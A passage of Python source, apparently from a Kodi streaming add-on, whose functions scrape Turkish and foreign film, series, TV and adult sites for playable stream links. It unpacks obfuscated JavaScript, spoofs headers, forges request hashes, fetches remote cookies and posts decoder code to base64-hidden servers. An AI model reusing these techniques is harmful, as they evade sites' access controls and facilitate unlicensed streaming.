        headers = {'Origin': 'https://mixdrop.co/','Referer': 'https://mixdrop.co/', 'User-Agent': UA}
        pattern = 'MDCore.wurl="(.*?)"'
    elif "luluvdo" in url or "dropload" in url:
        pattern = 'file:"(.*?)"'
        last = "#User-Agent=" + UA + "&Referer=" + url
    elif "streamhub" in url:
        pattern = 'src:"(.*?)"'
    elif "supervideo" in url or "clipwatching" in url or "filelions" in url :
        pattern = 'file:"(.*?)"'
    page = fetch(url)
    js_eval = re.findall('(eval\(function\(p,a,c,k,e,d.*?)\n', page)[0]
    detect(js_eval)
    un = unpack(eval)
    link = normalize_url(re.findall(pattern, un)[0] + last)
    return link + "#User-Agent=" + UA

def filmizlesene(url):
    url = url.split("?l=")[0]
    page = fetch(url, head = {"Referer": url, "User-Agent": UA})
    if "vidcontainer" in page:
        partial = re.findall("(?:inepisode|bolumler)(.*?)vidcontainer", page, re.DOTALL)[0]
    else:
        partial = re.findall('iframe.*?src="(.*?)"', page, re.DOTALL)[0]
        if "/ok/" in partial:
            media_id = partial.split("?v=")[1]
            media_id = base64(media_id)
            link = "https://odnoklassniki.ru/videoembed/" + media_id
            return link
        else:
            return link
    alts = re.findall('dil=".*?">(.*?)<.*?iframe\s*src="(.*?)"', partial, re.DOTALL)
    for alt in alts:
        if "opn" not in alt[1].lower() and "up" not in alt[1].lower(): 
            kaynaklar.append(alt[0])
            linkler.append(alt[1])
    if len(kaynaklar) > 1:
        internal_link = select(kaynaklar, linkler, 1)
    if len(kaynaklar) == 1:
        internal_link = linkler[0]
    if "mail.ru" in internal_link:
        return internal_link
    if "vidmoly" in internal_link:
        vidmoly_link = re.findall("vid=(.*?)$", internal_link)[0]
        return vidmoly_link
    page = fetch(internal_link, head = {"Referer": url, "User-Agent":UA})
    link_plus = re.findall('iframe\s*src=(?:\'|")(.*?)(?:\'|")', page, re.I)[0]
    link = link_plus
    if "hdplayer" in link or "player/drive/" in link:
        with requests.Session() as s:
            headers = {"Referer": link, "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"}
            r = s.get(link, headers=headers)
            r = s.get(link, headers=headers)
            page = r.text.encode().decode()
        link = re.findall('iframe.*?src\s*=\s*"(.*?)"', page)[0]
        if "odnoklass" in link:
            return link
        if "hdplayer" not in link:
            link1 = link
            page = fetch(link1, head={'Referer': link, "User-Agent": UA})
            return ydd(page, url)
    else:
        return link
    
def sinefy(url):
    if "?l=" in url:
        source = url.split("?l=")
        url = source[0]
        lang = source[1]
        page = requests.get(url, headers = {"User-Agent": UA}).text
        parts = re.findall('series-tabs(.*?)tabindex', page, re.DOTALL)[0]
        urls = re.findall('href="(.*?)"', parts)
        for url1 in urls:
            if lang == "1" and "dublaj" in url1:
                url = url1
            elif lang == "0" and "altyazi" in url1:
                url = url1
    page = requests.get(url, headers={"User-Agent": UA}).text
    page = "".join(page.split())
    kok = '/'.join(url.split('/')[:3])
    try:
        alts = re.findall('data-querytype=".*?ahref="(.*?)"data-navigo.*?>(.*?)<', page, re.DOTALL)
        dene = alts[0]
        for alt in alts:
            kaynaklar.append(alt[1].title())
            linkler.append(alt[0])
        sources = ["Pub", "Pub+", "Embed", "Vidmoly" ,"Fbd"]
        if len(kaynaklar) == 1: api_url = linkler[0]
        else: api_url = select(kaynaklar, linkler)
        if "selection cancelled" in api_url:
            return api_url
    except:
        datams = re.findall('data-whatwehave="(.*?)"\s*data-lang="(.*?)"', page)[0]
        datam = {"e_id": datams[0], "v_lang":datams[1], "type": "get_whatwehave"}
        page = fetch(kok + "/ajax/service", data = datam, head = {"x-requested-with": "XMLHttpRequest"})
        api_url = re.findall('"api_iframe":\s*"(.*?)"', page)[0].replace("\\","")            
    page = requests.get(api_url, headers = {"User-Agent": UA}).text
    if "rapid" in api_url:
        return re.findall('file:"(.*?)"', page)[0]
    else:
        links = re.findall('iframe.*?src="(.*?)"', page)
        for lin in links:
            if "finema" not in lin:
                link= lin
        link = "https:" + link + "#Referer=" + url if link.startswith("//") else link  
        if "contentx" in link or "playru" in link or "hotlinger" in link or "pichive" in link or "//four" in link:
            link += "?l=" + lang
        return link 
    
def diziyo(url):
    kok = "/".join(url.split("/")[:3])
    page = fetch(url)
    iframe = re.findall('iframe\s*src\s*=\s*"(.*?)"', page)[0]
    h = iframe.split("video/")[1]
    # page = requests.get(iframe, headers ={"Referer": kok, "User-Agent": UA}).text
    # htemp = re.findall('const\s*h=\s*"(.*?)"', page)[0]
    data = {"hash": h, "r":""}
    page = requests.post("https://www.dzyhd.site/video/api.php?v=" + h, data = data, headers = {"X-Requested-With": "XMLHttpRequest", "referer": kok, "User-Agent": UA}).text
    data = json.loads(page)
    link = data.get("file")
    return link + '#User-Agent=' + UA + "&Accept=*/*" + "&Referer=" + baseUrl(iframe)

def meteor(url):
    page = fetch("http://www.meteorolojitv.gov.tr/canli")
    link = re.findall('src="(//.*?)"', page)[0]
    host = "/".join(link.split("/")[:3])
    son_ek = re.findall("(broad.*?)\?", link)[0]
    url = "http:" +  host + "/assets/player/html-5.3/videoonly.js"
    page = fetch(url)
    link = re.findall('"GET",\s*"(.*?)"', page)[0] + son_ek
    page = fetch(link, head={"Referer": host})
    js = json.loads(page)
    link = js["streams"][0]["url"]
    return link

def onlinedizi(url):
    data = re.findall('(.*?)\n(.*?)$',fetch(root2 + "/on_dz.txt"))[0]
    cook = data[0]
    ua = data[1]
    kok = "/".join(url.split("/")[:3])
    page = fetch(url, head = {"User-Agent": ua, "Cookie": cook})
    partial = re.findall('Alternatifler(.*?)episode-buttons', page)[0]
    alts = re.findall('href="(.*?)".*?>(.*?)<', partial)
    for alt in alts:
        kaynaklar.append(alt[1])
        linkler.append(alt[0])
    url = select(kaynaklar,linkler,1)
    if "selection cancelled" in url:
        return url
    page = fetch(url, head = {"Referer": kok, "User-Agent": ua, "Cookie": cook})
    iframe =  re.findall('iframe\s*src="(.*?)"', page)[0]
    if iframe.startswith("//"):
        iframe_link = "https:" + iframe
    elif iframe.startswith("/"):
        iframe_link = kok + iframe
    page =fetch(iframe_link,head={"Referer": kok, "User-Agent": ua, "Cookie": cook})
    link = re.findall('ifsrc = "(.*?)"', page)[0]
    link = kok +link if link.startswith("/") else link
    embed_link = requests.get (link, headers={"Referer": kok, "User-Agent": ua, "Cookie": cook}, allow_redirects=True).url
    if "gdplayer" in embed_link:
        page = fetch(embed_link,head={"Referer": kok, "User-Agent": ua, "Cookie": cook})
        pre_link = re.findall('(//gdplayer.org/api/.*?)"', page)[0]
        page = fetch("http:" + pre_link,head={"Referer": kok, "User-Agent": ua, "Cookie": cook})
        js = json.loads(page)
        link = js["sources"][0]["file"]
        return "http:" + link
    elif "fscdn.xyz" in embed_link:
        key = embed_link.split("/")[4]
        embed_link = embed_link + "?do=getVideo"
        data = {"hash": key, "r": kok, "s":""}
        page = fetch(embed_link, data = data, head = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest",
                                                      "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with":"XMLHttpRequest"})
        js = json.loads(page)
        link = js["videoSources"][0]["file"]
        if "fcdn" not in link:
            return link   
        elif "fcdn" in link:
            page = fetch(link,head={"Accept":"*/*"})
            links = re.findall('(https:.*?m3u8)', page)
            for link in links:
                videolist.append(link)
                if "240p/playlist" in link:
                    qualitylist.append("240p")
                elif "360p/playlist" in link:
                    qualitylist.append("360p")            
                elif "480p/playlist" in link:
                    qualitylist.append("480p")
                elif "720p/playlist" in link:
                    qualitylist.append("720p")
                elif "1080p/playlist" in link:
                    qualitylist.append("1080p")
                else :
                    qualitylist.append("Diger")
            return auto_select(qualitylist, videolist)
    elif "ondembed.xyz" in embed_link:
        return embed_link.replace('ondembed.xyz', 'fembed.com')
    else:
        return embed_link


def hdfilmcehennemisyrtrk(url):
    url = url.replace("hdfilmcehennemisyrtrk", "hdfilmcehennemi")
    referer = url
    kok = "/".join(url.split("/")[:3])
    page = fetch(url)
    page = "".join(page.split())
    alt_partial = re.findall('<nav\s*class="video-alternatives">(.*?)player-container', page)[0]
    alts = re.findall('<div\s*class="alternative-links".*?</div>', alt_partial)
    for alt in alts:
        lang = re.findall('data-lang="(.*?)"', alt)[0]
        sources = re.findall('data-video="(.*?)">(.*?)<\/button>', alt, re.DOTALL)
        for source in sources:
            if "Fragman" not in source[1] and "SinemaModu" not in source[1]:
                kaynaklar.append(source[1].replace("eD", "e D").replace("eA", "e A").replace("-", " - ") + " - " + lang)
                linkler.append(source[0])
    if len(kaynaklar)>1:
        url = select(kaynaklar, linkler, 1)
    else:
        url = linkler[0]
    if "selection cancelled" in url:
        return url
    page = fetch(kok + "/video/" + url + "/", head={"X-Requested-With": "fetch"})
    link = re.findall('<iframe.*?data-src=\\\\"(.*?)\\\\"', page)[0].replace("\\","")
    embed_kok = "/".join(link.split("/")[:3]) 
    subs = []
    if "player" in link or "video/embed" in link:
        page = fetch(link + "/", head={"Referer": referer})
        evall = re.findall("(eval\(function.*?)\n", page)[0]
        detect(evall)
        d = unpack(evall)
        if "player" in link or "rapid" in link:
            
            f_name = re.findall("function\s*(dc_.*?)\(value_parts\)",d)[0]
            regexString = f_name + "\\(.*?\\)\\s*{([\\s\\S]*?)}\\s*func"
            match = re.findall(regexString,d)
            fun = "function test(value_parts){" + match[0] + "}"
            fun = fun.encode('ascii', errors='ignore').decode('ascii').replace("// paralar birletir","")
            fun = re.sub(r'//[^l]*(?=let)', '', fun)
            regexString = "=\s*" + f_name + "\((.*?)\)"
            data_ = re.findall(regexString, d)
            payload = {"js_function": fun, "data": json.loads(data_[0])}
            match= json.loads(requests.post(decode_base64(hash_), json=payload).text)
            return [match["result"] + "#User-Agent=" + "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36", subs]

        elif "video/embed" in link:
            link = re.findall('"(aHR0c.*?)"',d)[0]
        
        try:
            tracks = re.findall('tracks:\s*(.*?\]),', page)[0]
            subtitles = re.findall('"file":"(.*?)"', tracks)
            for subtitle in subtitles:
                sub = kok + subtitle.replace("\\","")
                subs.append(sub)
        except:
            try:
                subtitles = re.findall('track\s*src="(.*?)"', page)
                for subtitle in subtitles:
                    sub = embed_kok + subtitle.replace("\\","")
                    subs.append(sub)
            except:
                pass
        if len(subs) > 1:
            UA = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
            return [link + "#Referer=" + kok + "&User-Agent=" + UA+ "&X-Requested-With=" + "fetch", subs]
    return link 

def sbembed(url):      
    def makeid(length):
        t = string.ascii_letters + string.digits
        return ''.join([random.choice(t) for _ in range(length)])
    referer = "/".join(url.split("/")[:3])
    host ="/".join(url.split("/")[2:3])
    media_id = url.split("/")[4].replace(".html","")
    x = '{0}||{1}||{2}||streamsb'.format(makeid(12), media_id, makeid(12))
    c1 = binascii.hexlify(x.encode('utf8')).decode('utf8')
    x = '{0}||{1}||{2}||streamsb'.format(makeid(12), makeid(12), makeid(12))
    c2 = binascii.hexlify(x.encode('utf8')).decode('utf8')
    x = '{0}||{1}||{2}||streamsb'.format(makeid(12), c2, makeid(12))
    c3 = binascii.hexlify(x.encode('utf8')).decode('utf8')
    nurl = 'https://{0}/sources50/{1}/{2}'.format(host, c1, c3)
    headers = {'User-Agent': UA,
               'Referer': referer,
               'watchsb': 'sbstream'}
    page = fetch(nurl, head = headers)
    data = json.loads(page)
    link = data["stream_data"]["file"] or data["stream_data"]["backup"]
    link = link + "#User-Agent=" + UA + "&Referer=" + referer
    return link

def streamz(url):
    page = fetch(url)
    evall = re.findall('(eval\(function.*?)</script>', page, re.DOTALL)[0]
    detect(evall)
    d = unpack(evall)
    dll = re.findall("src:'(.*?)'", d)[0]
    return fetch(dll, redir=1)

def trtparser(url):
    if "m3u8" in url:
        return url
    content = fetch(url)
    mp4link = re.findall("src:\s*'(.*?\.mp4)",content)
    return "https:" + mp4link[0]

def hdtoday(url):
    showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","[COLOR white][B]Sadece Android Uygulamamızda çalışır![/B][/COLOR]",4000)
    return "selection cancelled"

def streamlare(url):
    subs = []
    list = url.split("#")
    url = list[0]
    try:
        subs = list[1].split(",")
    except: pass
    media_id = re.findall('/(?:e|v)/([0-9A-Za-z]+)', url)[0]
    kok = '/'.join(url.split('/')[:3])
    api_durl = kok + '/api/video/download/get'
    api_surl = kok + '/api/video/stream/get'
    headers = {'User-Agent': UA,
               'Referer': kok,
               'X-Requested-With': 'XMLHttpRequest'}
    data = {'id': media_id}
    page = fetch(api_surl, head = headers, data = data)
    try:
        link = re.findall('"file":"(.*?)"', page)[0].replace('\\','')
    except:
        page = json.loads(fetch(api_durl, head = headers, data = data))
        link = page["result"]["Original"]["url"]
    if "?token=" in link:
        link = fetch(link, head=headers, redir = 1)
    if len(subs) >0:
        return [link + "#User-Agent=" + UA + "&Referer=" + kok + "&X-Requested-With=XMLHttpRequest", subs]
    else:
        return link + "#User-Agent=" + UA + "&Referer=" + kok + "&X-Requested-With=XMLHttpRequest"

def sinemafilmizle(url):
    parts = url.split("?l=")
    url = parts[0]
    lang = parts[1]
    page = requests.get(url, headers = {"User-Agent": UA, "cookie": "smys=" + str(int(time.time()))}).text
    if lang == "1":
        alts = re.findall('span\s*id="source\d+.*?dil="trd">(.*?)<.*?<iframe src="(.*?)"', page, re.DOTALL)
    elif lang == "0":
        alts = re.findall('span\s*id="source\d+.*?dil="tra">(.*?)<.*?<iframe src="(.*?)"', page, re.DOTALL)
    for alt in alts:
        kaynaklar.append(alt[0])
        linkler.append(alt[1])
    link = select(kaynaklar, linkler)
    if "selection cancelled" in link:
        return link
    if "my.mail.ru" in link:
        return link
    elif "vidmoly" in link:
        page = requests.get(link, headers = {"User-Agent": UA, "Referer": url, "cookie": "smys=" + str(int(time.time()))}).text
        link = re.findall('iframe\s*src="(.*?)"', page)[0]
        page = requests.get(link, headers = {"User-Agent": UA, "Referer": url, "cookie": "smys=" + str(int(time.time()))}).text
        link = re.findall('iframe\s*src="(.*?)"', page)[0]
        return link
    else:
        page = requests.get(link, headers = {"User-Agent": UA, "Referer": url}).text
        mlink = re.findall('player">\s*<iframe.*?src=["\'](.*?)["\']', page, re.DOTALL|re.IGNORECASE)[0]
        if "odno" in mlink:
            return mlink
        with requests.Session() as s:
            headers = {"Referer": mlink, "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"}
            r = s.get(mlink, headers=headers)
            r = s.get(mlink, headers=headers)
            page = r.text.encode().decode()
        mlink = re.findall('id="player.*?src=["\'](.*?)["\']', page, re.DOTALL|re.IGNORECASE)[0]
        page = requests.get(mlink, headers={"User-Agent": "Mozilla 5/0",'Referer': url}).text
        link = ydd(page, url)
        return link
    
def canlitvcenter(url):
    kok = "/".join(url.split("/")[:3])
    headers = {"Referer": kok}
    page = requests.get(url, headers={"User-Agent": UA}).text
    iframe = re.findall('"embedUrl":"(.*?)"', page)[0]
    if "m3u8" in iframe:
        link = iframe
    elif "youtube.com/embed" in iframe:
        link = re.findall("channel=(.*?)&", iframe)[0]
        link = decode_base64("aHR0cHM6Ly9iZXl0ZXBlbWFuYXYudGsvc2V5L2tvZGkvZ2V0bGluazIucGhwP3A9") + link
    return link

def dizimom(url): 
    kok = "/".join(url.split("/")[:3])
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest",
               "content-type":"application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1"}
    page = fetch(url, head=headers)
    alts = re.findall('href="([^"]*)".*?dil=', page)
    if len(alts) > 0:
        alts.insert(0, url)
        for i in range(0, len(alts)):
            kaynaklar.append("Kaynak " + str(i + 1))
        url2 = select(kaynaklar, alts)
        if url != url2:
            page = fetch(url, head=headers)
    embed = re.findall(r'iframe.*?src="([^\"]+(?:embed|video).*?)"', page)[0]
    if "youtube" in embed:
        return embed
    hash = embed.split("/")[-1]
    if "data=" in hash:
        hash = hash.split("=")[-1]
    if "videoseyred" in embed or "vidmoly" in embed or "ok.ru" in embed or "suhiaza" in embed:
        play_link = embed
    elif "hdmomplayer" in embed:
        headers["Referer"] = kok
        page = fetch(embed, head = headers)
        keys = re. findall("bePlayer\('\s*(.*?)'\s*,\s*'(.*?)'\)",page)[0]
        v1 = Quote(keys[0])
        v2 = Quote(keys[1])
        play_link = hdmom(v1,v2,embed)
        name = 'cont' + ''.join(random.choice(string.ascii_lowercase) for i in range(10))
        page = requests.get(play_link[0].split("#")[0], headers = {"User-Agent": UA, "Referer": embed, "Origin": embed, "Accept": "*/*"}).text
        try:
            linko = re.findall('CODECS.*?\n(.*?)\n', page)[0]
        except:
            linko = re.findall('URI="(.*?")', page)[0]
        page = requests.get(linko, headers = {"User-Agent": UA, "Referer": embed, "Origin": embed, "Accept": "*/*"}).text
        r = requests.post(root2 + "/kodi/contentx/online.php", data ={"url": page, "name": name}, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text
        time.sleep(2)
        link2 = root2 + '/kodi/contentx/play.php?name=' + name
        play_link = [link2 + "#" + play_link[0].split("#")[1]]
    elif "/v/" in embed:
        play_link = embed
    elif "tv/video" in embed:
        link = embed + "?do=getVideo"
        js = requests.post(link, data = {"r": url, "hash": hash}, headers=headers).json()
        link = js.get("videoSrc").replace("teve2", "tv2").replace("https://tv2.com.tr/embed/","https://tv2.com.tr/action/media/")
        if "tv2" in link:
            js = requests.get(link, headers= headers).json()
            play_link = js["Media"]["Link"]["ServiceUrl"] + js["Media"]["Link"]["SecurePath"] 
        return play_link
    else:
        match = re.search(r"(https://hdplayersystem\.[a-z]+)/video/(.*)", embed)

        if match:
            base_domain = match.group(1) # Örn: https://hdplayersystem.xyz
            hash_val = match.group(2)    # Örn: a1b2c3d4
            
            # Yeni URL'yi oluşturma
            embed = f"{base_domain}/player/index.php?data={hash_val}"
        sign = "?"
        if "?" in embed:
            sign = "&"
        page = fetch(embed + sign + "do=getVideo", data = {"Hash": hash, "r": url}, head = headers)
        try:
            play_link = re. findall('file":"(.*?)"',page)[0].replace("\\","") + ""
        except:
            play_link = re. findall('"securedLink":"(.*?)"',page)[0].replace("\\","")
    if "videoseyred" in play_link:
        return play_link
    if not "googlevideo" in play_link and not "?tag=" in play_link and "tv2" not in play_link:
        return play_link + "#User-Agent=Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36&Referer=" + url    
    else:
        return play_link
        
def filmon(url):
    media_id = url.replace("https://www.filmon.com/","")
    page = requests.post("https://www.filmon.com/ajax/getChannelInfo", data = {"channel_id": media_id, "quality": "low"},
                 headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest",
                            "Cookie": "PHPSESSID="}).text
    link = json.loads(page)["serverURL"]
    return link

def videoone(url):
    kok = baseUrl(url) + "/"
    timestr = str(int(time.time()))
    url = normalize_url(url)
    page = fetch(kok + "video.js?" + timestr, head = {"Referer": url})
    key_value = re.findall('window,["\'](.*?)["\'],["\'](.*?)["\']', page)
    code = url.split("iframe/")[-1]
    url = kok + "ajax/" + code + "?" + str(int(time.time()))
    page = fetch(url, head={'Referer': kok, key_value[0][0]: key_value[0][1]})
    data = json.loads(page)
    link = data["file"] + "?" + data["hash"] + "#Referer=" + kok
    return link

def beyaztv(url):
    page = fetch(url)
    link = re.findall('videoUrl\s*=\s*"(.*?)"',page)[0]
    return link

def yirmidort(url):
    page = fetch(url)
    link = re.findall('source\s*src="(.*?)"',page)[0]
    return link    
    
def hugo(site="dizi"):
    if site != "sfi":
        suffix = "hugo.php"
    else:
        suffix = "hugo.php?type=sfi"
    page = fetch(secure("root") + suffix)
    return page.strip()

def siyahfilmizle(url):
    url = url.split("?l=")
    page = requests.get(url[0]).text
    alts = re.findall('(href="([^"]+)"\s*title="page".*?(Film.*?)\s*<)',page,re.DOTALL)
    if alts:
        for alt in alts:
            if "fl tr" in alt[0]:
                kaynaklar.append(alt[2] + "-TR")
                linkler.append(alt[1])
            if "fl en" in alt[0]:
                kaynaklar.append(alt[2] + "-EN")
                linkler.append(alt[1])
        link = select(kaynaklar, linkler)
        page = requests.get(link).text
    link = normalize_url(re.findall('iframe.*?src=["\'](.*?)["\']', page)[0].replace("#038;",""))
    if "trstx" in link or "sobreatsesuyp" in link:
        link = link + "?l=" + url[1]
    elif "bemoly" in link:
        link = re.findall("url=(.*?)&", link)[0]
    return (link)

def radyodelisi(url):
    return re.findall('source\s*src="(.*?)"', requests.get(url).text)[0]

def vidoza(url):
    return re.findall('source\s*src="(.*?)"', requests.get(url).text)[0]

def sto(url):
    kok = "/".join(url.split("/")[:3])
    url = url.split("?l=")
    page = requests.get(url[0]).text
    links = re.findall('data-lang-key="(\d)"\s*data-link-id="\d+"\s*data-link-target="(.*?)".*?Hoster\s(.*?)"', page, re.DOTALL)
    for link in links:
        if (url[1] == "0" and link[0] == "2") or (url[1] == "3" and link[0] == "1"):
            kaynaklar.append(link[2])
            linkler.append(kok + link[1])
    link = select(kaynaklar, linkler,1)
    link = requests.get(link).url
    return link

def streamwish(url):
    return re.findall('\[\{file:"(.*?)"', requests.get(url).text)[0]

def cinemathek(url):
    kok = "/".join(url.split("/")[:3])
    url = url.split("?l=")
    page = requests.get(url[0]).text
    data = re.findall('data-post="(\d+)"\s*data-nume="(\d+)">.*?title">(?:Episode|Film) starten!\s*(.*?)</span>', page, re.DOTALL)
    tip = "movie"
    if "episoden" in url:
        tip = "tv"
    for link in data:
        kaynaklar.append(link[2])
        linkler.append(kok + "/wp-json/dooplayer/v2/" + link[0] + "/" + tip +"/" + link[1])
    link = select(kaynaklar, linkler, 1)
    page = requests.get(link).text
    my_json = json.loads(page)
    link = my_json["embed_url"]
    return link

def movie4k(url):
    url = url.split("?l=")
    page = requests.get(url[0]).text
    data = re.findall('class="tablinks"\s*href="#"\s*data-link="(.*?)">(.*?)<', page)
    for link in data:
        if "Server 4K" not in link[1] and "Trailer" not in link[1]:
            kaynaklar.append(link[1])
            linkler.append(normalize_url(url))
    link = select(kaynaklar, linkler, 1)
    return link

def goodstream(url):
    page = requests.get(url).text
    link = re.findall('file:\s*"(.*?)"', page, re.DOTALL)[0]
    return link

def vimeo(url):
    page = fetch(url)
    js = re.findall('playerConfig\s*=\s*(\{.*?\})<', page)[0]
    my_json = json.loads(js)
    return my_json["request"]["files"]["hls"]["cdns"]["akfire_interconnect_quic"]["url"]

def trstx(url):
    url_raw = url.split("?l=")
    url = url_raw[0]
    page = requests.get(url, headers ={"Referer": url}).text
    link = re.findall('playerConfigs\s*=\s*(.*?);', page)[0]
    js = json.loads(link)
    link = normalize_url(js["domain"] + js["file"])
    page = requests.get(link, headers={"Referer": link}).text
    desen = '"title":"(.*?)".*?file":"(.*?)"'
    part = re.findall(desen, page)
    if url_raw[1] == "44":
        for par in part:
            lang = "Türkçe Dublaj"
            if "Altya" in par[0]:
                lang = "Türkçe Altyazılı"
            kaynaklar.append(lang)
            linkler.append(par[1])
        if len(kaynaklar)> 1:
            part = select(kaynaklar, linkler,1)
        else:
            part = linkler[0]
    elif url_raw[1] == "0":
         for par in part:
             if "Altyaz" in par[0]:
                 part = par[1]
    elif url_raw[1] == "1":
         for par in part:
             if "Dublaj" in par[0]:
                 part = par[1]      
    link = re.sub('playlist/(.*?)$', "playlist/" + part + "!!.txt", link)
    link = requests.get(link, headers={"User-Agent": UA, "Accept": "*/*", "Referer": link}).text
    return link

def ydd(text, ref):
    if "document.write(decodeURIComponent" in text:
        constant = int(re.findall("''\)\)\s*-\s*(\d+)\)",text)[0])
        hiddens = re.findall('"(.*?)"', text)
        ints = []
        for hidden in hiddens:
            if hidden != "":
                try:
                    inte = int(re.findall('(\d+)',decode_base64(hidden))[0]) - constant
                    ints.append(inte)
                except:
                    pass
        text = ''.join(map(chr, ints))
    try:
        link2 = re.findall('iframe.*?src\s*=\s*[\'"](.*?)[\'"]', text)[0]
        if "&#" in link2:
            link2 = link2.replace("&#","").split(";")
            s = []
            for a in link2:
                try:
                    s.append(int(a))
                except:
                    pass
            link2 = ''.join(map(chr, s))
        page= requests.get(link2, headers = {"User-Agent": UA, "Referer": ref}).text
    except:
        page = text
    data1 = re.findall('CryptoJS\.AES\.decrypt\("(.*?)","(.*?)"\)', page)[0]
    page = requests.post(root2 + "/v2/test.php", headers = {"Accept": "*/*", "User-Agent": UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}, data = {"ct": Quote_plus(data1[0]), "pass": Quote_plus(data1[1])}).text
    try:
        link = re.findall("file\s*:\s*[\"'](.*?)[\"']",page)[0]  
    except:
        link =re.findall('<source src="(.*?)"', page)[0]
    headers = {"User-Agent": UA,'Referer': "/".join(link.split("/")[:3]) +"/"}
    name = 'cont' + ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    page = fetch(link, head=headers)
    r = requests.post(root2 + "/kodi/contentx/online.php", data ={"url": page, "name": name}, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text
    time.sleep(2)
    link2 = root2 + '/kodi/contentx/play.php?name=' + name
    link2 = link2 + '#Referer=' + link + '&User-Agent=' + UA
    return link2

def yabancidizi(url):
    kok = '/'.join(url.split('/')[:3]) + '/'
    page = fetch(url.split("?l=")[0], head = {"User-Agent": UA})
    alts = re.findall('data-eid="(.*?)"\s*data-type="(\d+)"', page)
    index = 0
    if url.split("?l=")[1] == "1" : index = 1
    credit = re.findall('(.*?)\n(.*?)$', requests.get(root.replace("back/", "yb_dz.txt")).text)
    ua = credit[0][1]
    cook = "udys=" + str(int(time.time())) + ";" + credit[0][0]
    headers = {"User-Agent": ua, "Referer": url, "content-type":"application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "cookie": cook}
    data = {"lang": alts[index][1], "episode": alts[index][0], "type": "langTab"}
    page = fetch(kok + "ajax/service", head = headers, data = data)
    alts = re.findall('data-hash="(.*?)"\s*data-link="(.*?)"\s*data-eid="(.*?)"\s*data-querytype="alternate">(.*?)<', page.replace("\\",""))
    res = list(zip(*alts))
    selected = select(res[3], res[3])
    index = res[3].index(selected)
    data = {'hash': alts[index][0], 'link': alts[index][1], 'querytype': 'alternate', 'type': 'videoGet'}
    page = fetch(kok + "ajax/service", head= headers, data= data)
    link = json.loads(page)["api_iframe"]
    if 'api/cf' in link or 'api/indi' in link:
        link = re.findall('file:"(.*?)"', page)[0]
    else:
         page = fetch(link, head = headers)
    if "api/drive" not in link:
        link = re.findall('<iframe.*?src=["\'](.*?)["\']', page)[0]
    elif 'api/drive' in link:
        link = ydd(page, url.split("?l=")[0])
    return link

def youporn(url):
    page = requests.get(url, headers = {"User-Agent": "Mozilla"}).text
    raw_link = re.findall('playervars\s*:\s*(.*?)\n', page)[0]
    js = json.loads(raw_link)
    for  links in  js[ "mediaDefinitions"]:
        if links["format"] == "hls":
            link = links["videoUrl"]
        else:
            link = links["videoUrl"]
    page = requests.get(link).text
    js = json.loads(page)
    js = sorted(js, key=lambda k: int(k["quality"]), reverse=True)
    for j in js:
        try:
            link = j["videoUrl"]
            break
        except:
            pass
    return link

def teleontv(url):
    page = requests.get(url).text
    return re.findall('\[2160\](.*?.m3u8)', page)[0]

def lookmovie2(url):
    main_page = requests.get(url, headers={"User-Agent": UA}).text
    play_url = re.findall('<a\s*href="(/movies/play/.*?)"', main_page)[0]
    play_url = "https://www.lookmovie2.to" + play_url if play_url.startswith("/") else play_url
    play_page = requests.get(play_url, headers={"User-Agent": UA, "Cookie":"PHPSESSID=agecjthk83ujncqe4ea25p5ioi; _ga=;"}).text
    id_movie = re.findall('id_movie\s*:\s*(\d+)', play_page)[0]
    hash = re.findall('hash\s*:\s*"(.*?)"', play_page)[0]
    expires = re.findall('expires\s*:\s*(\d+)', play_page)[0]
    api_url = "https://www.lookmovie2.to/api/v1/security/movie-access?id_movie=" + id_movie + "&hash=" + hash + "&expires=" + expires
    api_page = requests.get(api_url, headers={"User-Agent": UA}).text
    js = json.loads(api_page)
    try:
        link = js["streams"]["1080p"]
    except:
        link = js["streams"]["720p"]
    subtitle = []
    for sub in js["subtitles"]:
        subtitle.append("https://www.lookmovie2.to" +sub["file"])
    return [link, subtitle]

def upload_to_server(text):
    name = 'cont' + ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    r = requests.post(root2 + "/kodi/contentx/online.php", data ={"url": text, "name": name}, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text
    link = root2 + '/kodi/contentx/play.php?name=' + name
    return link 

def themoviearchive(url):
    url_raw = url.split("#")
    url = url_raw[0]
    sub = ""
    tmdb = url.split("tmdb=")[1]
    url = "https://prod.omega.themoviearchive.site/v3/movie/sources/" + tmdb
    page = requests.get(url, headers = {"User-Agent" : UA}).text
    js = json.loads(page)
    kaynaklar =[]
    linkler = []
    for i,source in enumerate(js["sources"], start=1):
        linkler.append(source["sources"][0]["url"])
        kaynaklar.append("Kaynak" + str(i) + "(" + source["sources"][0]["quality"] + ")")
    link = select(kaynaklar, linkler)
